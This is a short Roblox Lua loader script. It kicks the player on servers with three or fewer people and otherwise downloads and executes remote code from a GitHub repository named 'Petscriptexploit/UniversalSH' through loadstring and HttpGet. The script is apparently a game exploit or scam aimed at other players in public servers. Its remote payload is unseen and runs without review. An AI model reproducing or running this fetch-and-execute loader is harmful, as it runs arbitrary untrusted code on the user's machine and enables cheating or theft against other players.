local function isPrivateServer()
    return game.Players.NumPlayers <= 3
end

local function kickIfPrivateServer()
    if isPrivateServer() then
        game.Players.LocalPlayer:Kick("Run again in a public server or with more than 3 people")
    else
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Petscriptexploit/UniversalSH/refs/heads/main/a'))()
    end
end

kickIfPrivateServer()
